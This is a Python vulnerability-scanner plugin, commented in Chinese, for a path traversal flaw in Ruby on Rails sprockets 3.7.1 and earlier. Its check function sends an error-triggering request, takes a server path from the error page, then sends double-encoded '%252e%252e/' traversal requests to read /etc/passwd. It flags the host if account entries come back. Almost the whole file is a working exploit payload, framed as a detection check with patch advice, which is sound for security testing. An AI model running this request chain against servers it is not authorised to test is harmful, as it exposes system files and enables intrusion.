#!/usr/bin/env python 
# -*- coding:utf-8 -*-

import requests
import re

def get_plugin_info():
    plugin_info = {
        "name": "Ruby On Rails 路径穿越漏洞",
        "info": "prockets 3.7.1及之前版本中，存在一处因为二次解码导致的路径穿越漏洞，攻击者可以利用%252e%252e/来跨越到根目录，读取或执行目标服务器上任意文件。",
        "level": "h",
        "type": "路径穿越与任意文件读取",
        "url": "https://xz.aliyun.com/t/2542",
        "feature": "none",
        "is_web": 1,
        "is_pwd": 0,
        "solution": "1、在打补丁前，应限制问题设备的互联网访问权限。2、更新补丁"
    }
    return plugin_info


def check(ip, port, timeout, is_debug=True, task_id=-1):
    try:
        payload1 = "/assets/file:%2f%2f/etc/passwd"   # 会返回报错信息
        url1 = "http://" + ip + ":" + str(port) + payload1

        # 第一次请求错误页面，构造第二次的漏洞payload
        r = requests.get(url1, timeout=timeout)
        r.encoding = "utf-8"
        data = r.text
        #print data
        stri = '\/[^\s<>,]+\/[^\s<>,]+\/[^\s<>,]+'
        r = re.findall(stri, data)
        #print r

        # 第二次请求触发，二次编码绕过
        payload2 = r[7]
        p = re.split("\/", payload2)
        url2= "http://" + ip + ":" + str(port) + "/assets/file:%2f%2f" + payload2 + "/"
        # print url2
        l = len(p) - 1
        while(l):
            url2 += "%252e%252e/"
            l=l-1
        url2 += "etc/passwd"
        # print url2
        r = requests.get(url2, timeout=timeout)
        r.encoding = "utf-8"
        d = r.text
        # print d

        if 'root:' in d and 'nobody:' in d:
            return u"Ruby On Rails the path through the holes and read arbitrary files."
    except:
        pass

# 以下为本地测试代码
# if __name__ == "__main__":
#     str = check("192.168.166.10", 3000, 3,)
#     if (str):
#         print str
#     else:
#         print u"不存在此漏洞"